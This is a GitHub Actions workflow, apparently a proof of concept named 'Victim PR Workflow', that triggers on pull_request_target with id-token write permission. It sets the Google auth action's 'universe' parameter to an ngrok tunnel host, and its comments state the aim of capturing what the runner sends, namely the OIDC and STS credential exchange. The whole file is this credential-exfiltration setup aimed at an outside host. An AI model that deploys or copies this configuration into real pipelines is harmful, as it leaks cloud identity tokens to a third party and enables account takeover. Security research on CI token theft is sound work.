name: Victim PR Workflow

on:
  push:
    branches:
      - main
  pull_request_target:
    types: [opened, synchronize]

jobs:
  auth:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4
      - id: auth
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: 'projects/123456/locations/global/workloadIdentityPools/test-pool/providers/test-provider'
          service_account: 'test@test-project.iam.gserviceaccount.com'
          universe: 'db99-113-161-40-207.ngrok-free.app'
          create_credentials_file: true
      - name: Trigger STS via script
        continue-on-error: true
        run: |
          # The action will attempt to call sts.db99-113-161-40-207.ngrok-free.app
          # We force a call to capture what the runner sends
          echo "Triggering capture..."
